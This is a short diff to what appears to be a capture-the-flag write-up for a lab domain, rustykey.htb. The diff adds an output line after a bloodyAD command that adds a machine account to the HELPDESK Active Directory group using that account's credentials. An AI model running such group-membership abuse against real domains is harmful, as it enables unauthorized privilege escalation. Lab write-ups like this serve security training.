@@ -94,6 +94,7 @@ Password: Rus<pass>
 
 ```bash
 bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k add groupMember HELPDESK 'IT-COMPUTER3$'
+[+] IT-COMPUTER3$ added to HELPDESK
 ```
 
 ```bash
